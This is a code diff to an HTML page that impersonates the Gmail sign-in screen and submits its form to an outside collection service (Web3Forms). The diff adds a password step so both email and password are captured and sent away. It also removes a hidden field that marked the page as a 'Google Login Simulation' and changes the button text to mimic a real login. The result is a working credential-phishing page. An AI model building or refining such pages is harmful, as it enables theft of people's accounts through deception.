@@ -59,7 +59,7 @@
             line-height: 1.5;
         }
 
-        input[type="email"] {
+        input[type="email"], input[type="password"] {
             appearance: none;
             width: 100%;
             box-sizing: border-box;
@@ -73,7 +73,7 @@
             transition: border 0.2s;
         }
 
-        input[type="email"]:focus {
+        input:focus {
             border: 2px solid var(--primary-blue);
             padding: 12px 14px;
         }
@@ -113,10 +113,6 @@
             font-weight: 500;
         }
 
-        .forgot-link:hover {
-           text-decoration: underline !important; 
-        }
-
         .footer-text {
             margin-top: 30px;
             font-size: 14px;
@@ -127,6 +123,15 @@
         .footer-text a {
             color: var(--primary-blue);
             text-decoration: none;
+        }
+        
+        /* Utility classes for hiding/showing steps */
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
         }
         
         .clearfix::after {
@@ -146,7 +151,7 @@
         <h1>Sign in</h1>
         <p class="subtitle">to continue to Gmail</p>
 
-        <!-- Web3Forms Integration for the "Email" Step -->
+        <!-- Web3Forms Integration -->
         <form action="https://api.web3forms.com/submit" method="POST" id="googleForm">
             
             <!-- Your Access Key -->
@@ -155,17 +160,30 @@
             <!-- Optional: Redirect after submission -->
             <!-- <input type="hidden" name="redirect" value="https://yourdomain.com/thank-you"> -->
 
-            <!-- Hidden field to identify this as a "Login" attempt -->
-            <input type="hidden" name="form_type" value="Google Login Simulation">
+            <!-- Step 1: Email -->
+            <div id="step-email" class="step active">
+                <label for="email" style="display:none;">Email</label>
+                <input type="email" id="email" name="email" placeholder="Email or phone" required autocomplete="username">
+                
+                <button type="button" class="next-btn" onclick="goToPassword()">Next</button>
+                
+                <div class="clearfix"></div>
+                
+                <a href="#" class="forgot-link">Forgot email?</a>
+            </div>
 
-            <label for="email" style="display:none;">Email</label>
-            <input type="email" id="email" name="email" placeholder="Email or phone" required autocomplete="username">
-            
-            <button type="submit" class="next-btn">Next</button>
-            
-            <div class="clearfix"></div>
-            
-            <a href="#" class="forgot-link">Forgot email?</a>
+            <!-- Step 2: Password -->
+            <div id="step-password" class="step">
+                <label for="password" style="display:none;">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                
+                <button type="submit" class="next-btn">Next</button>
+                
+                <div class="clearfix"></div>
+                
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+
         </form>
 
         <div class="footer-text">
@@ -175,12 +193,21 @@
     </div>
 
     <script>
-        // Optional: Add loading state to button
+        function goToPassword() {
+            // Hide email step, show password step
+            document.getElementById('step-email').classList.remove('active');
+            document.getElementById('step-password').classList.add('active');
+            
+            // Focus the password field automatically
+            document.getElementById('password').focus();
+        }
+
+        // Add loading state on final submit
         const form = document.getElementById('googleForm');
-        const btn = document.querySelector('.next-btn');
+        const btn = document.querySelector('#step-password .next-btn');
 
         form.addEventListener('submit', () => {
-            btn.textContent = "Checking...";
+            btn.textContent = "Signing in...";
             btn.style.backgroundColor = "#9aa0a6";
             btn.disabled = true;
         });
